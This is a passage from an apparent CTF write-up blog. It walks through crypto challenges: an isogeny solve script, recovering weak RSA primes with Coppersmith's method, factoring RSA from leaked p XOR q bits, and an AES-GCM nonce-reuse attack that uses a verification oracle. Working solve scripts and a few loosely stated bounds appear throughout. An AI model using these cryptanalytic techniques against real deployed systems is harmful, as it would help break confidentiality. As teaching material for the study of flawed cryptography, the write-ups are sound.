sqrt(-rhs)) if not Tm.is_zero(): break def get_uv(T): u = T.weil_pairing(Q2, p+1).log(pairing_base) v = Q1.weil_pairing(T, p+1).log(pairing_base) return u, v up, vp = get_uv(Tp) um, vm = get_uv(Tm) v_found = 0 img1_p = up * P_imgs[1] + vp * PP_imgs[1] img1_m = um * P_imgs[1] + vm * PP_imgs[1] if img1_p.is_zero(): count = 1 for j in range(2, 16): if (up * P_imgs[j] + vp * PP_imgs[j]).is_zero(): count += 1 else: break v_found = count elif img1_m.is_zero(): count = 1 for j in range(2, 16): if (um * P_imgs[j] + vm * PP_imgs[j]).is_zero(): count += 1 else: break v_found = -count sk1.append(int(v_found)) SK = [[0]*74] SK.append(sk1) quick = [int(-sign(x)) for x in sk1] curr = list(sk1) for _ in range(14): curr = [int(curr[k] + quick[k]) for k in range(74)] SK.append(curr) key_str = str(SK) aes_key = hashlib.sha256(key_str.encode()).digest() res = bytes.fromhex(hex_res) iv, ct = res[:16], res[16:] cipher = AES.new(aes_key, AES.MODE_CBC, iv) flag = unpad(cipher.decrypt(ct), 16) print(f\"\\n[+] Success! Flag: {flag.decode()}\") Flag: shellmates{Weil_Pairing_and_Frobenius_u_get_torsion_group_Kernel_Sign} ","date":"2025-12-22","objectID":"/posts/geni/:5:0","tags":["isogeny","crypto","csidh","weil-pairing"],"title":"Geni","uri":"/posts/geni/"},{"categories":["Cryptography"],"content":"Breaking a hybrid RSA-ECC cryptosystem through weak prime generation. Challenge Info CTF: Ingeneer Challenge: Vrai Sahl Category: Crypto Points: Hard Description: I didn’t have much time, so I made an easy challenge but labeled it hard—kind of like calling a first-year spell a N.E.W.T.-level exam. Sorry for the mix-up! ","date":"2025-05-26","objectID":"/posts/ingeneer/:0:0","tags":["ingeneer2025"],"title":"Vrai Sahll","uri":"/posts/ingeneer/"},{"categories":["Cryptography"],"content":"TL;DR This challenge presented a hybrid encryption scheme combining RSA and Elliptic Curve Cryptography (ECC). The primary vulnerability lay in the RSA prime generation, where a significant portion of the least significant bits (LSBs) of both prime factors was generated using a predictable pattern. The exploitation involved three stages: Exploit weak RSA primes: Recover LSBs using the fixed 0x3 nibble vulnerability Factor the modulus: Apply Coppersmith’s method to find remaining MSBs Extract the flag: Use polynomial GCD to find the common root of two equations ","date":"2025-05-26","objectID":"/posts/ingeneer/:1:0","tags":["ingeneer2025"],"title":"Vrai Sahll","uri":"/posts/ingeneer/"},{"categories":["Cryptography"],"content":"Initial Analysis The challenge source code main.py reveals a multi-layered encryption process: from Crypto.Util.number import * from random import * from sage.all import * def generate_custom_prime(): while True: suffix = str(getRandomNBitInteger(140)).encode().hex()[2:] prefix = hex(getRandomNBitInteger(100))[2:] candidate = int(prefix + suffix, 16) if isPrime(candidate): return candidate def get_flag_value(): with open(\"flag.txt\", \"rb\") as f: return bytes_to_long(f.read().strip()) def elliptic_curve_encrypt(flag_val): p = getPrime(512) q = getPrime(512) modulus = p * q # ecc_modulus y = randint(0, modulus - 1) a = randint(1, modulus) b = (y**2 - (flag_val**3 + a * flag_val)) % modulus curve = EllipticCurve(Zmod(modulus), [a, b]) base = curve(flag_val, y) result_point = 2 * base encrypted = pow(bytes_to_long(b'ANA M9WD'), 0x10001, modulus) return { \"a\": a, \"b\": b, \"point\": result_point.xy(), \"modulus\": modulus, \"ciphertext\": encrypted } def hybrid_encrypt(flag_val, ecc_modulus): P = generate_custom_prime() Q = generate_custom_prime() rsa_modulus = P * Q pub = pow(flag_val + P, 0x10001, ecc_modulus) rsa_ciphertext = pow(bytes_to_long(b'ANA CHIKOUR'), 0x10001, rsa_modulus) return { \"rsa_modulus\": rsa_modulus, \"pub\": pub, \"ciphertext\": rsa_ciphertext } def main(): flag_val = get_flag_value() ecc_data = elliptic_curve_encrypt(flag_val) hybrid_data = hybrid_encrypt(flag_val, ecc_data[\"modulus\"]) save_all(ecc_data, hybrid_data) main() ","date":"2025-05-26","objectID":"/posts/ingeneer/:2:0","tags":["ingeneer2025"],"title":"Vrai Sahll","uri":"/posts/ingeneer/"},{"categories":["Cryptography"],"content":"RSA Weakness: generate_custom_prime() Critical Vulnerability The function constructs candidate primes by concatenating: A random 100-bit prefix A random 140-bit suffix (converted via str → bytes → hex) The vulnerability: When converting a number to string, then to hex bytes, the ASCII representation of digits ‘0’-‘9’ always produces bytes starting with 0x3: Character Hex Byte ‘0’ 0x30 ‘1’ 0x31 … … ‘9’ 0x39 This means the first nibble of every byte in the suffix is fixed to 0x3. ","date":"2025-05-26","objectID":"/posts/ingeneer/:2:1","tags":["ingeneer2025"],"title":"Vrai Sahll","uri":"/posts/ingeneer/"},{"categories":["Cryptography"],"content":"Elliptic Curve Encryption An elliptic curve is defined over the ECC modulus: $$E: y^2 \\equiv x^3 + ax + b \\pmod{n}$$ The flag value is used as the x-coordinate of the base point: \\(\\text{base} = ({\\tt flag_val}, y)\\) \\(\\text{result_point} = 2 \\cdot \\text{base}\\) The x-coordinate of result_point is leaked as point[0]. ","date":"2025-05-26","objectID":"/posts/ingeneer/:2:2","tags":["ingeneer2025"],"title":"Vrai Sahll","uri":"/posts/ingeneer/"},{"categories":["Cryptography"],"content":"Hybrid Encryption Layer The crucial equation linking everything: $${\\tt pub} = ({\\tt flag_val} + P)^{0x10001} \\pmod{n}$$ where \\(P\\) is one of the weak RSA primes and \\(n\\) is the ECC modulus. ","date":"2025-05-26","objectID":"/posts/ingeneer/:2:3","tags":["ingeneer2025"],"title":"Vrai Sahll","uri":"/posts/ingeneer/"},{"categories":["Cryptography"],"content":"Task Analysis The challenge requires three sequential stages: Stage Task Method 1 Recover LSBs of \\(P\\) and \\(Q\\) Brute-force second nibble (10 candidates per byte) 2 Factor rsa_modulus completely Coppersmith’s theorem on small roots 3 Extract flag value Polynomial GCD of two equations ","date":"2025-05-26","objectID":"/posts/ingeneer/:3:0","tags":["ingeneer2025"],"title":"Vrai Sahll","uri":"/posts/ingeneer/"},{"categories":["Cryptography"],"content":"Exploitation ","date":"2025-05-26","objectID":"/posts/ingeneer/:4:0","tags":["ingeneer2025"],"title":"Vrai Sahll","uri":"/posts/ingeneer/"},{"categories":["Cryptography"],"content":"Part 1: Recovering RSA Prime LSBs Since each byte has the first nibble fixed to 0x3, we only need to brute-force the second nibble (0-9, not 0-F). This reduces the search space from \\(16 \\times 16\\) to \\(10 \\times 10\\) per byte pair. Algorithm: Iterate from LSB upward, recovering bytes incrementally by checking if the product matches modulo powers of 16. def bf_2nd_nibbles(N, A, B, n): for x in range(16): # Possible values for the 2nd nibble of P for y in range(16): # Possible values for the 2nd nibble of Q # Construct candidate for P's current byte: 0x3X... bfA = 0x3 * pow(16, n - 1) + pow(16, n - 2) * x + A # Construct candidate for Q's current byte: 0x3X... bfB = 0x3 * pow(16, n - 1) + pow(16, n - 2) * y + B # Check if product matches modulo 16^n if bfA * bfB % pow(16, n) == N % pow(16, n): return bfA, bfB return None, None p = q = 0 for i in range(2, 86, 2): # Recover up to 86 nibbles (43 bytes) p, q = bf_2nd_nibbles(rsa_n, p, q, i) Why This Works If \\(P \\approx P_{\\text{high}} \\cdot 2^k + p_{\\text{known}}\\) and \\(Q \\approx Q_{\\text{high}} \\cdot 2^k + q_{\\text{known}}\\), then: $$N \\equiv P \\cdot Q \\pmod{2^{8k}}$$ By checking this congruence for increasing \\(k\\), we progressively recover more bits of both primes. ","date":"2025-05-26","objectID":"/posts/ingeneer/:4:1","tags":["ingeneer2025"],"title":"Vrai Sahll","uri":"/posts/ingeneer/"},{"categories":["Cryptography"],"content":"Part 2: Factoring RSA with Coppersmith’s Method After recovering \\(p_{\\text{known}}\\) and \\(q_{\\text{known}}\\) (sufficient LSBs), we have: $$P = x \\cdot R + p_{\\text{known}}$$ $$Q = y \\cdot R + q_{\\text{known}}$$ where \\(R = 2^{\\text{known_bits}}\\) and \\(x, y\\) are the unknown high parts (small relative to \\(N\\)). Substituting into \\(N = P \\cdot Q\\): $$N = (x \\cdot R + p_{\\text{known}})(y \\cdot R + q_{\\text{known}})$$ This is a bivariate polynomial with small roots \\(x\\) and \\(y\\). Coppersmith’s theorem finds them efficiently: R = 2 ** (p.bit_length()) x, y = var('x y') p_ = x * R + p q_ = y * R + q f = (p_ * q_ - rsa_n).expand() PR = PolynomialRing(Zmod(rsa_n), names=('x', 'y')) f = PR(f) x, y = f.parent().gens() # Find small roots using lattice reduction roots = small_roots(f, [R, R], m=3, d=4) x_root, y_root = roots[0] P = int(x_root * R + p) Q = rsa_n // P # Verify: rsa_n % P == 0 Coppersmith's Theorem If a polynomial \\(f(x, y)\\) of degree \\(d\\) has a root \\((x_0, y_0)\\) where \\(|x_0| \u003c X\\) and \\(|y_0| \u003c Y\\), and if \\(XY \u003c N^{d/(d+1)}\\), then the root can be found in polynomial time using lattice reduction (LLL algorithm). ","date":"2025-05-26","objectID":"/posts/ingeneer/:4:2","tags":["ingeneer2025"],"title":"Vrai Sahll","uri":"/posts/ingeneer/"},{"categories":["Cryptography"],"content":"Part 3: Recovering the Flag via Polynomial GCD The flag is the common root of two polynomials over \\(\\mathbb{Z}_n\\) (ECC modulus). Polynomial from hybrid encryption From \\({\\tt pub} = (z + P)^{0x10001} \\pmod{n}\\), we get: $$f(z) = (z + P)^{0x10001} - {\\tt pub}$$ Polynomial from elliptic curve point doubling For a point \\((x_1, y_1)\\) on \\(y^2 = x^3 + ax + b\\), the x-coordinate of \\(2(x_1, y_1)\\) is: $$x_2 = \\left(\\frac{3x_1^2 + a}{2y_1}\\right)^2 - 2x_1$$ With \\(x_1 = z\\) (the flag) and \\(x_2 = {\\tt point}[0]\\) (known), we can eliminate \\(y_1\\) using \\(y_1^2 = z^3 + az + b\\): $$4(z^3 + az + b)({\\tt point}[0] + 2z) = (3z^2 + a)^2$$ Therefore: $$g(z) = (3z^2 + a)^2 - 4(z^3 + az + b)(2z + {\\tt point}[0])$$ Finding the common root Both polynomials share \\(z = {\\tt flag_val}\\) as a root. Computing their GCD gives \\((z - m)\\) where \\(m = {\\tt flag_val}\\): F = Zmod(n) PR = PolynomialRing(F, names=('z',)) z = PR.gen() f = (z + Q) ** 0x10001 - pub g = (3 * z**2 + a)**2 - 4 * (z**3 + a * z + b) * (2 * z + point[0]) # Compute polynomial GCD using Euclidean algorithm def pgcd(g1, g2): return g1.monic() if not g2 else pgcd(g2, g1 % g2) result = pgcd(f, g) # Result is of form (z - m) m = -result.coefficients()[0] # Extract the root print(long_to_bytes(int(m))) # Reveal the flag! Why GCD Works If \\(\\alpha\\) is a root of both \\(f(z)\\) and \\(g(z)\\), then \\((z - \\alpha)\\) divides \\(\\gcd(f(z), g(z))\\). If there’s exactly one common root, the GCD is linear: \\(c(z - \\alpha)\\) for some constant \\(c\\). Normalizing to monic form gives \\((z - \\alpha)\\) directly. ","date":"2025-05-26","objectID":"/posts/ingeneer/:4:3","tags":["ingeneer2025"],"title":"Vrai Sahll","uri":"/posts/ingeneer/"},{"categories":["Cryptography"],"content":"Behind the Math ","date":"2025-05-26","objectID":"/posts/ingeneer/:5:0","tags":["ingeneer2025"],"title":"Vrai Sahll","uri":"/posts/ingeneer/"},{"categories":["Cryptography"],"content":"Weak Prime Suffix The ASCII hex encoding of digits constrains the LSBs of primes to a highly predictable pattern. This reduces brute-force complexity from exponential to tractable. ","date":"2025-05-26","objectID":"/posts/ingeneer/:5:1","tags":["ingeneer2025"],"title":"Vrai Sahll","uri":"/posts/ingeneer/"},{"categories":["Cryptography"],"content":"Coppersmith’s Method A cornerstone of RSA cryptanalysis: Coppersmith’s Theorem (1997): If you know a significant portion (MSBs or LSBs) of a prime factor of \\(N\\), you can recover the remaining bits in polynomial time. This applies to our scenario where we’ve recovered \\(\\approx 140\\) bits of \\(P\\) (the suffix) out of \\(\\approx 240\\) bits total. ","date":"2025-05-26","objectID":"/posts/ingeneer/:5:2","tags":["ingeneer2025"],"title":"Vrai Sahll","uri":"/posts/ingeneer/"},{"categories":["Cryptography"],"content":"Elliptic Curve Point Doubling Formula On the curve \\(y^2 = x^3 + ax + b\\), point doubling uses the tangent line’s slope: $$\\lambda = \\frac{3x^2 + a}{2y}$$ The resulting x-coordinate is: $$x(2P) = \\lambda^2 - 2x(P)$$ By substituting known values and using the curve equation, we derive a polynomial constraint on \\(x(P)\\). ","date":"2025-05-26","objectID":"/posts/ingeneer/:5:3","tags":["ingeneer2025"],"title":"Vrai Sahll","uri":"/posts/ingeneer/"},{"categories":["Cryptography"],"content":"Polynomial GCD for Common Roots The Euclidean algorithm for polynomials finds \\(\\gcd(f, g)\\) by successive remainder operations. If both polynomials share a root, that root appears in the GCD. For a linear GCD \\((z - m)\\), the constant term is \\(-m\\). ","date":"2025-05-26","objectID":"/posts/ingeneer/:5:4","tags":["ingeneer2025"],"title":"Vrai Sahll","uri":"/posts/ingeneer/"},{"categories":["Cryptography"],"content":"Conclusions “Vrai Sahl” exemplified sophisticated cryptographic vulnerabilities: Key Lessons Random number generation is critical: Even subtle patterns in prime construction (like ASCII hex encoding) can be exploited for complete factorization. Coppersmith’s method is powerful: It transforms partial knowledge into complete recovery of cryptographic secrets. Hybrid systems require careful integration: Vulnerabilities in one component (RSA primes) can compromise the entire system (ECC + RSA). Polynomial algebra is a cryptanalytic tool: GCD computation over finite fields reveals hidden relationships between encrypted values. Defense requires rigor: Use cryptographic libraries’ standard random prime generators, never implement your own. This challenge demonstrates how cryptographic implementations with subtle flaws can be completely compromised through sophisticated mathematical attacks. ","date":"2025-05-26","objectID":"/posts/ingeneer/:6:0","tags":["ingeneer2025"],"title":"Vrai Sahll","uri":"/posts/ingeneer/"},{"categories":["Cryptography"],"content":"Exploiting RSA with leaked XOR bits","date":"2025-04-21","objectID":"/posts/umass/","tags":["umass"],"title":"XORSA","uri":"/posts/umass/"},{"categories":["Cryptography"],"content":" Challenge Info CTF: UMASSCTF Challenge: XORSA Category: Crypto Points: 488 (19 solves) Description: I leaked a bit more than half of the XOR of the primes. ","date":"2025-04-21","objectID":"/posts/umass/:0:0","tags":["umass"],"title":"XORSA","uri":"/posts/umass/"},{"categories":["Cryptography"],"content":"TL;DR This challenge involved exploiting a vulnerability in an RSA implementation where the creator leaked more than half of the XOR of the prime factors. The solution reconstructs the prime factors bit-by-bit using a recursive approach that: Starts with the most significant bits Uses the leaked XOR bits to constrain possibilities Prunes invalid paths via product bounds Switches to Coppersmith’s method for remaining bits Decrypts the flag with the recovered private key ","date":"2025-04-21","objectID":"/posts/umass/:1:0","tags":["umass"],"title":"XORSA","uri":"/posts/umass/"},{"categories":["Cryptography"],"content":"Challenge Overview The challenge provides this RSA implementation: from Crypto.Util import number flag = b\"REDACTED\" bits = 1024 p = number.getPrime(bits) q = number.getPrime(bits) n = p * q phi = (p - 1) * (q - 1) e = 65537 d = number.inverse(e, phi) extra = 75 c = pow(int.from_bytes(flag, 'big'), e, n) print(f\"n: {hex(n)}\") print(f\"e: {hex(e)}\") print(f\"c: {hex(c)}\") print(f\"partial p^q: {hex((p^q) \u003e\u003e (bits // 2 - extra))}\") This looks like standard RSA encryption, but there’s a critical information leak: $${\\tt partial\\ p\\oplus q} = (p \\oplus q) \\gg (\\text{bits} // 2 - \\text{extra})$$ The Vulnerability The script leaks the most significant \\( \\text{bits}/2 + \\text{extra} \\) bits of \\( p \\oplus q \\). With \\( \\text{bits} = 1024 \\) and \\( \\text{extra} = 75 \\), we get: 1024/2 + 75 = 575 bits of the XOR leaked Out of 1024 total bits That’s 56% of the information about the relationship between \\( p \\) and \\( q \\) This is a catastrophic information leak! ","date":"2025-04-21","objectID":"/posts/umass/:2:0","tags":["umass"],"title":"XORSA","uri":"/posts/umass/"},{"categories":["Cryptography"],"content":"Task Analysis What do we know? Known Unknown MSBs of \\( p \\oplus q \\) (575 bits) LSBs of \\( p \\oplus q \\) (449 bits) \\( n = p \\cdot q \\) \\( p \\) and \\( q \\) individually Public key \\( (n, e) \\) Private key \\( d \\) Ciphertext \\( c \\) Plaintext \\( m \\) Key Insight: The XOR constraint dramatically reduces the search space. For each bit position, if we know \\( p_i \\oplus q_i \\), we only have 2 possibilities instead of 4: \\( p_i \\oplus q_i \\) Valid \\( (p_i, q_i) \\) pairs 0 (0, 0) or (1, 1) 1 (0, 1) or (1, 0) This is much better than trying all 4 combinations! Mathematical Background This approach is based on the discussion: Integer factorization with additional knowledge of \\( p \\oplus q \\) The key observation: tracking sets of k-bit values that satisfy \\( p_k \\cdot q_k \\equiv n \\pmod{2^k} \\), then extending by one bit at a time. With the XOR constraint, most paths get pruned, leaving few valid continuations. ","date":"2025-04-21","objectID":"/posts/umass/:3:0","tags":["umass"],"title":"XORSA","uri":"/posts/umass/"},{"categories":["Cryptography"],"content":"Exploitation ","date":"2025-04-21","objectID":"/posts/umass/:4:0","tags":["umass"],"title":"XORSA","uri":"/posts/umass/"},{"categories":["Cryptography"],"content":"Algorithm Overview Our recursive algorithm works from MSB to LSB: Start at the most significant bit For each bit position, try both possibilities allowed by \\( p \\oplus q \\) Prune invalid candidates using product bounds Once XOR bits are exhausted, use Coppersmith’s method for remaining bits Recover the private key and decrypt ","date":"2025-04-21","objectID":"/posts/umass/:4:1","tags":["umass"],"title":"XORSA","uri":"/posts/umass/"},{"categories":["Cryptography"],"content":"Product Bounds Pruning For partially reconstructed \\( p_{\\text{high}} \\) and \\( q_{\\text{high}} \\), if we’ve decided \\( k \\) bits, the remaining \\( m \\) bits form unknown parts. The minimum product (all remaining bits 0): $$p_{\\min} \\cdot q_{\\min} = (p_{\\text{high}} \\ll m) \\cdot (q_{\\text{high}} \\ll m)$$ The maximum product (all remaining bits 1): $$p_{\\max} \\cdot q_{\\max} = ((p_{\\text{high}} « m) + 2^m - 1) \\cdot ((q_{\\text{high}} « m) + 2^m - 1)$$ Pruning rule: If \\( n \\) is outside \\( [p_{\\min}, p_{\\max}] \\), this branch cannot produce the target modulus and can be skipped! ┌─────────────────────────┐ │ Bit-by-bit recursion │ ├─────────────────────────┤ │ k = 1023 (MSB) │ │ Try 2 possibilities │ │ ├─ Check bounds │ │ ├─ If valid: recurse │ │ └─ If invalid: skip │ │ │ │ ...repeat down to LSB │ │ │ │ k \u003c 512 - 75 │ │ └─ Call Coppersmith │ └─────────────────────────┘ ","date":"2025-04-21","objectID":"/posts/umass/:4:2","tags":["umass"],"title":"XORSA","uri":"/posts/umass/"},{"categories":["Cryptography"],"content":"Complete Solution from Crypto.Util.number import * from sage.all import * import sys load('coppersmith.sage') b = 1024 xor = 0x64... # Leaked XOR of p and q (MSBs) n = 0x46... # RSA modulus e = 0x10001 # Public exponent c = 0x38... # Ciphertext def find(k, p_high, q_high): \"\"\" Recursively recover p and q bit by bit from MSB to LSB Args: k: Current bit position (starts at NBITS-1, decreases) p_high: Recovered bits of p so far q_high: Recovered bits of q so far \"\"\" l = p_high.bit_length() # Switch to Coppersmith once we've used all leaked XOR bits if k \u003c b//2 - 75: l = 512 - 75 R = 2**l x, y = var('x y') p_ = p_high * R + x q_ = q_high * R + y f = (p_ * q_ - n).expand() PR = PolynomialRing(Zmod(n), names=('x', 'y')) f = PR(f) try: x, y = small_roots(f, [R, R], m=3, d=4)[0] P = int(p_high * R + x) Q = int(q_high * R + y) if n % P == 0: phi = (P - 1) * (Q - 1) d = inverse(e, phi) m = pow(c, d, n) print(long_to_bytes(m)) sys.exit(0) except: pass return # Extract the XOR bit at position k xor_k = (xor \u003e\u003e (k - b//2 + 75)) \u0026 1 # Determine valid bit pairs possibilities = [(0, 0), (1, 1)] if xor_k == 0 else [(0, 1), (1, 0)] for p_k, q_k in possibilities: # Extend with new bits p_high_new = (p_high \u003c\u003c 1) | p_k q_high_new = (q_high \u003c\u003c 1) | q_k # Calculate bounds for remaining bits m = NBITS - k shift = NBITS - m min_prod = (p_high_new \u003c\u003c shift) * (q_high_new \u003c\u003c shift) max_prod = (((p_high_new \u003c\u003c shift) + (1 \u003c\u003c shift) - 1) * ((q_high_new \u003c\u003c shift) + (1 \u003c\u003c shift) - 1)) # Prune if n cannot be achieved if min_prod \u003c= n \u003c= max_prod: find(k - 1, p_high_new, q_high_new) NBITS = b find(NBITS - 1, 0, 0) Why This Works Complexity Analysis: Without any constraints, we’d need to try all \\( 2^{1024} \\) combinations (infeasible). With the XOR constraint, we branch with factor 2 at each step, giving \\( 2^{1024} \\) possibilities still… But the bounds checking prunes ~99% of branches! Most bit combinations make \\( n \\) unachievable. Combined with Coppersmith’s method for the final stretch, this becomes tractable. ","date":"2025-04-21","objectID":"/posts/umass/:4:3","tags":["umass"],"title":"XORSA","uri":"/posts/umass/"},{"categories":["Cryptography"],"content":"Behind the Math ","date":"2025-04-21","objectID":"/posts/umass/:5:0","tags":["umass"],"title":"XORSA","uri":"/posts/umass/"},{"categories":["Cryptography"],"content":"Why XOR Information is Powerful For each bit position \\( i \\): $$p_i \\oplus q_i = \\begin{cases} 0 \u0026 \\text{if } p_i = q_i \\ 1 \u0026 \\text{if } p_i \\neq q_i \\end{cases}$$ This transforms a combinatorial search problem (try all \\( 2^{1024} \\) candidates) into a constraint satisfaction problem (only 2 valid choices per bit). ","date":"2025-04-21","objectID":"/posts/umass/:5:1","tags":["umass"],"title":"XORSA","uri":"/posts/umass/"},{"categories":["Cryptography"],"content":"Product Bounds as a Pruning Heuristic The modulus \\( n = p \\cdot q \\) is a strict constraint. For fixed MSBs: $$p = p_{\\text{high}} \\cdot 2^m + p_{\\text{low}}$$ $$q = q_{\\text{high}} \\cdot 2^m + q_{\\text{low}}$$ where \\( 0 \\leq p_{\\text{low}}, q_{\\text{low}} \u003c 2^m \\). Therefore: $$n = (p_{\\text{high}} \\cdot 2^m + p_{\\text{low}}) \\cdot (q_{\\text{high}} \\cdot 2^m + q_{\\text{low}})$$ The product ranges from: $$(p_{\\text{high}} \\cdot 2^m) \\cdot (q_{\\text{high}} \\cdot 2^m)$$ to: $$((p_{\\text{high}} + 1) \\cdot 2^m - 1) \\cdot ((q_{\\text{high}} + 1) \\cdot 2^m - 1)$$ If \\( n \\) is outside this range, no valid \\( p_{\\text{low}}, q_{\\text{low}} \\) exist. Pruning is safe! ","date":"2025-04-21","objectID":"/posts/umass/:5:2","tags":["umass"],"title":"XORSA","uri":"/posts/umass/"},{"categories":["Cryptography"],"content":"Coppersmith’s Method for the Tail Once we’ve fixed ~575 MSBs via the XOR constraint, we need to find the remaining ~449 bits. These form a “small” root: $$f(x, y) = (p_{\\text{high}} \\cdot R + x) \\cdot (q_{\\text{high}} \\cdot R + y) - n$$ where \\( R = 2^{449} \\) and \\( x, y \u003c R \\). Coppersmith’s theorem guarantees we can find this small root using lattice reduction (LLL algorithm), provided: $$X \\cdot Y \u003c n^{1/(d+1)}$$ where \\( d \\) is the polynomial degree and \\( X, Y \\) are the bounds on roots. ","date":"2025-04-21","objectID":"/posts/umass/:5:3","tags":["umass"],"title":"XORSA","uri":"/posts/umass/"},{"categories":["Cryptography"],"content":"Exploitation Timeline ┌────────────┐ │ Start │ └─────┬──────┘ │ ├─ Parse leaked XOR (575 MSBs) ├─ Parse modulus n └─ Start recursive search from MSB │ ├─ [~5 mins] Try bit combinations with bounds checking ├─ Most branches pruned early ├─ Explore ~10,000 valid paths to LSB │ └─ [~5 mins] Hit base case, call Coppersmith │ ├─ Solve \\\\( f(x,y) = p_{\\text{high}} \\cdot R + x \\\\) ├─ Recover p and q └─ Compute \\\\( d = e^{-1} \\pmod{\\phi(n)} \\\\) │ └─ [~1 sec] Decrypt: \\\\( m = c^d \\pmod{n} \\\\) │ └─ Flag: UMASS{i_will_make_a_solve_script} Total runtime: ~10 minutes ","date":"2025-04-21","objectID":"/posts/umass/:6:0","tags":["umass"],"title":"XORSA","uri":"/posts/umass/"},{"categories":["Cryptography"],"content":"Conclusions Key Takeaways Information Leakage Breaks RSA: Any partial information about \\( p \\) and \\( q \\) or their relationships can compromise security. The XOR of primes should be as secret as the primes themselves. Constraint Satisfaction \u003e Brute Force: Rather than trying all \\( 2^{1024} \\) candidates, the XOR constraint and bounds checking reduced the search space by ~99+%, making factorization tractable. Hybrid Approaches: Combining classical bit-by-bit search with modern lattice techniques (Coppersmith) gives a powerful cryptanalytic tool. Implementation Flaws Matter: This vulnerability came from a seemingly minor leak—just shifting right instead of discarding all bits. One line of code broke 1024-bit RSA. Formal Security Proofs: RSA’s security depends on factorization hardness. Proving no information leaks about \\( p \\oplus q \\) is crucial. ","date":"2025-04-21","objectID":"/posts/umass/:7:0","tags":["umass"],"title":"XORSA","uri":"/posts/umass/"},{"categories":["Cryptography"],"content":"References Integer factorization with additional knowledge of \\( p \\oplus q \\) XOR Factor Implementation Coppersmith’s Attack on RSA Coppersmith, D. “Small solutions to polynomial equations, and low exponent RSA vulnerabilities.” Journal of Cryptology 10.4 (1997): 233-260. ","date":"2025-04-21","objectID":"/posts/umass/:8:0","tags":["umass"],"title":"XORSA","uri":"/posts/umass/"},{"categories":["Cryptography"],"content":" Challenge Info CTF: blackhat-finals Challenge: TDS Category: Crypto Description: AES-GCM implementation with oracle access ","date":"2025-01-16","objectID":"/posts/black-hat/:0:0","tags":["blackhat-finals","crypto","aes-gcm","polynomial","oracle"],"title":"TDS","uri":"/posts/black-hat/"},{"categories":["Cryptography"],"content":"TL;DR This challenge exploits weaknesses in AES-GCM authentication when given: A flag ciphertext and its authentication tag Two encryption oracle calls with the same key/nonce Unlimited verification oracle with controllable AAD and ciphertext length The solution: Recovers the GCM mask by encrypting an empty string Recovers the authentication key H by solving a polynomial equation Brute-forces the keystream byte-by-byte using the verification oracle XORs the recovered keystream with the flag ciphertext ","date":"2025-01-16","objectID":"/posts/black-hat/:1:0","tags":["blackhat-finals","crypto","aes-gcm","polynomial","oracle"],"title":"TDS","uri":"/posts/black-hat/"},{"categories":["Cryptography"],"content":"Challenge Overview The server implements AES-GCM encryption and provides several operations: # Encrypts the flag with unknown key/nonce flag_ciphertext, flag_tag = encrypt(FLAG, key, nonce, b\"\") # Gives us 2 encryption oracle calls user_plaintext = input(\"your_text1:\") ciphertext, tag = encrypt(user_plaintext.encode(), key, nonce, b\"\") user_plaintext = input(\"your_text2:\") ciphertext, tag = encrypt(user_plaintext.encode(), key, nonce, b\"\") # Unlimited verification oracle while True: length = int(input(\"length:\")) aad = base64.b64decode(input(\"aad: \")) print(query(ciphertext[:length], aad, key, tag, nonce)) The Vulnerability The critical flaws: Nonce reuse: Same nonce used for all encryptions Verification oracle: We can verify arbitrary (AAD, ciphertext_prefix, tag) tuples Controllable AAD: The oracle lets us control additional authenticated data This breaks the security model of AES-GCM completely! ","date":"2025-01-16","objectID":"/posts/black-hat/:2:0","tags":["blackhat-finals","crypto","aes-gcm","polynomial","oracle"],"title":"TDS","uri":"/posts/black-hat/"},{"categories":["Cryptography"],"content":"Understanding GCM Authentication GCM Authentication Mechanism AES-GCM authentication is based on GHASH, a polynomial hash over GF(2^128). Understanding this is crucial to solving the challenge. For a comprehensive explanation, see: AES-GCM Deep Dive This resource provides all the mathematical details needed to understand the attack. ","date":"2025-01-16","objectID":"/posts/black-hat/:3:0","tags":["blackhat-finals","crypto","aes-gcm","polynomial","oracle"],"title":"TDS","uri":"/posts/black-hat/"},{"categories":["Cryptography"],"content":"GHASH Polynomial The authentication tag in GCM is computed as: $$\\text{tag} = \\text{GHASH}(H, A, C) \\oplus E_K(N \\mathbin\\Vert 0^{31} \\mathbin\\Vert 1)$$ Where: $H = E_K(0^{128})$ is the authentication key $A$ is the additional authenticated data (AAD) $C$ is the ciphertext $E_K(N \\mathbin\\Vert 0^{31} \\mathbin\\Vert 1)$ is the mask (keystream at counter 0) The GHASH function computes: $$\\text{GHASH}(H, A, C) = \\sum_{i=1}^{m} A_i \\cdot H^{m+n+1-i+1} + \\sum_{j=1}^{n} C_j \\cdot H^{n+1-j+1} + L \\cdot H$$ Where: $A_i$ are 128-bit blocks of AAD $C_j$ are 128-bit blocks of ciphertext $L = (\\text{len}(A) \\mathbin\\Vert \\text{len}(C))$ is the length block All operations are in $\\text{GF}(2^{128})$ Key insight: If we know the tag and all blocks except H, we can solve for H as a polynomial root! ","date":"2025-01-16","objectID":"/posts/black-hat/:3:1","tags":["blackhat-finals","crypto","aes-gcm","polynomial","oracle"],"title":"TDS","uri":"/posts/black-hat/"},{"categories":["Cryptography"],"content":"Exploitation Strategy ","date":"2025-01-16","objectID":"/posts/black-hat/:4:0","tags":["blackhat-finals","crypto","aes-gcm","polynomial","oracle"],"title":"TDS","uri":"/posts/black-hat/"},{"categories":["Cryptography"],"content":"Phase 1: Recover the Mask The mask is $E_K(N \\mathbin\\Vert 0^{31} \\mathbin\\Vert 1)$. When we encrypt an empty string with no AAD: $$\\text{tag}_\\emptyset = \\text{GHASH}(H, \\emptyset, \\emptyset) \\oplus \\text{mask} = (0 \\oplus 0 \\oplus L \\cdot H) \\oplus \\text{mask}$$ But since both AAD and ciphertext are empty, $L = 0$, so: $$\\text{tag}_\\emptyset = 0 \\oplus \\text{mask} = \\text{mask}$$ # Send empty string as first encryption io.sendlineafter(b\"your_text1:\", b\"\") io.recvuntil(b\"tag1: \") mask = bytes_to_long(base64.b64decode(io.recvline().strip())) ","date":"2025-01-16","objectID":"/posts/black-hat/:4:1","tags":["blackhat-finals","crypto","aes-gcm","polynomial","oracle"],"title":"TDS","uri":"/posts/black-hat/"},{"categories":["Cryptography"],"content":"Phase 2: Recover Authentication Key H Now we have: Flag ciphertext blocks: $C_1, C_2, \\ldots, C_n$ Flag tag: $\\text{tag}_{\\text{flag}}$ Mask value We can compute: $$\\text{GHASH}{\\text{flag}} = \\text{tag}{\\text{flag}} \\oplus \\text{mask}$$ The GHASH equation becomes: $$\\text{GHASH}_{\\text{flag}} = C_1 \\cdot H^{n+1} + C_2 \\cdot H^n + \\cdots + C_n \\cdot H^2 + L \\cdot H$$ This is a 